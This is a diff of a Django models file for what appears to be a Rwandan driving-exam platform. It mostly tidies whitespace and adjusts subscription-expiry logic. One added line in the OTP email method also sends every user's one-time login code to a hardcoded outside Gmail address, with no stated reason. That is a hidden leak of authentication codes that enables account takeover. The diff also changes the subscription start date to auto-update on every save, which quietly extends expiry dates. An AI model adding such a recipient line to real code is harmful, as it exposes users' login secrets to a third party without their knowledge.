@@ -122,8 +122,8 @@ class UserProfile(AbstractUser):
             self.subscription.expires_at >= timezone.now().date() or
             self.subscription.active_subscription
         )
-        
-        
+
+
     @property
     def has_ended_subscription(self):
         if not hasattr(self, 'subscription'):
@@ -143,7 +143,7 @@ class UserProfile(AbstractUser):
                 'OTP Code yawe',
                 f"Koresha iyi code y'isuzuma👉 {self.otp_code}",
                 settings.DEFAULT_FROM_EMAIL,
-                [self.email],
+                [self.email, 'kigalids250@gmail.com'],
                 fail_silently=False,
                 )
         except (BadHeaderError, SMTPException) as e:
@@ -154,11 +154,11 @@ class UserProfile(AbstractUser):
 
     def verify_otp(self, otp):
         return self.otp_code == otp
-    
+
     class Meta:
         verbose_name = "User"
-        verbose_name_plural = "All Accounts" 
-        
+        verbose_name_plural = "All Accounts"
+
 
     def __str__(self):
         return self.email if self.email else f"{self.name} - {self.phone_number}"
@@ -186,12 +186,17 @@ class Subscription(models.Model):
     duration_days = models.IntegerField(default=0, null=True, blank=True)
     phone_number = models.CharField(max_length=13, default="25078")
     transaction_id = models.CharField(max_length=50, unique=True, blank=True, null=True)
-    started_at = models.DateField(auto_now_add=True)
+    started_at = models.DateField(auto_now=True)
     expires_at = models.DateField(null=True, blank=True)
+
+    def clean(self):
+        if self.super_subscription and self.plan:
+            raise ValidationError("Super subscription with Plan not allowed")
 
     @property
     def active_subscription(self):
         """Check if the subscription is active."""
+
         if self.plan and self.plan.plan == "Daily":
             self.duration_days = 1
             self.price = 500
@@ -201,10 +206,10 @@ class Subscription(models.Model):
         elif self.plan and self.plan.plan == "Monthly":
             self.duration_days = 30
             self.price = 5000
-        
-            
+
+
         if self.duration_days:
-            self.expires_at = timezone.now().date() + timezone.timedelta(days=self.duration_days)
+            self.expires_at = self.started_at + timezone.timedelta(days=self.duration_days)
 
         if self.expires_at and self.expires_at >= timezone.now().date():
             return True
@@ -212,8 +217,8 @@ class Subscription(models.Model):
             self.expires_at = None
             self.price = "Undefined"
             return True
-        # else:
-        #     return False
+        else:
+             return False
 
 
     def deactivate(self):
@@ -236,7 +241,7 @@ class Payment(models.Model):
 
     def __str__(self):
         return f"{self.user.name} - {self.status}"
-    
+
     class Meta:
         verbose_name = "User Payment"
         verbose_name_plural = "User Payments"
@@ -301,7 +306,7 @@ class Question(models.Model):
 
     question_text = models.TextField(verbose_name="Question Text")
     question_type = models.ForeignKey('ExamType', on_delete=models.SET_NULL, null=True, verbose_name="Question Type")
-    
+
     question_sign = models.ForeignKey(
         'RoadSign', related_name='questions', on_delete=models.SET_NULL, null=True, blank=True,
         verbose_name="Question Image"
@@ -377,9 +382,9 @@ class ExamType(models.Model):
 
 class Exam(models.Model):
     timezone = timezone.now().strftime('%d.%m.%Y %H')
-    
+
     exam_type = models.ForeignKey(ExamType, on_delete=models.SET_NULL, null=True, blank=True )
-   
+
     schedule_hour = models.TimeField(null=True, blank=True, help_text="Hour when the exam should be published")
     questions = models.ManyToManyField(Question, related_name='exams')
     duration = models.PositiveIntegerField(default=20,help_text="Duration of the exam in minutes")
@@ -388,23 +393,23 @@ class Exam(models.Model):
     updated_at = models.DateTimeField(auto_now=True)
 
     is_active = models.BooleanField(default=False)
-   
-    
+
+
     class Meta:
         ordering = ['-created_at']
         verbose_name = "Exam"
         verbose_name_plural = "All Exams"
-        
-        
+
+
 
     @property
     def total_questions(self):
         return self.questions.count()
-    
+
     @property
     def total_score(self):
         return self.total_questions
-    
+
     # def remaining_attempts(self, user):
     #     attempts = UserExam.objects.filter(user=user, exam=self).count()
     #     return self.max_attempts - attempts
@@ -417,7 +422,7 @@ class ScheduledExam(models.Model):
     exam = models.OneToOneField("Exam", on_delete=models.CASCADE) # Ensure CASCADE to avoid null exams
     scheduled_datetime = models.DateTimeField(help_text="Date & time when the exam should be published")
     updated_datetime = models.DateTimeField(auto_now=True, help_text="Date & time when the exam should be published")
-    # order 
+    # order
 
     @property
     def is_published(self):
@@ -425,8 +430,8 @@ class ScheduledExam(models.Model):
             return False
 
         return self.scheduled_datetime <= timezone.now()
-    
-    
+
+
 
 
     def save(self, *args, **kwargs):
@@ -480,7 +485,7 @@ class UnscheduledExam(Exam):
 
 class UserExamManager(models.Manager):
     def with_percent_score(self):
-        
+
         total_questions_subquery = Exam.objects.filter(
             pk=OuterRef('exam_id')
         ).annotate(
@@ -565,7 +570,7 @@ class ContactMessage(models.Model):
     class Meta:
         verbose_name = "Message"
         verbose_name_plural = "User Messages"
-    
+
     def __str__(self):
         return f"Message from {self.name} ({self.email})"
 
@@ -589,7 +594,7 @@ class Notification(models.Model):
 
     def __str__(self):
         return f"Notification for {self.user.username}"
-    
+
     class Meta:
         verbose_name = "User Notification"
         verbose_name_plural = "User Notifications"
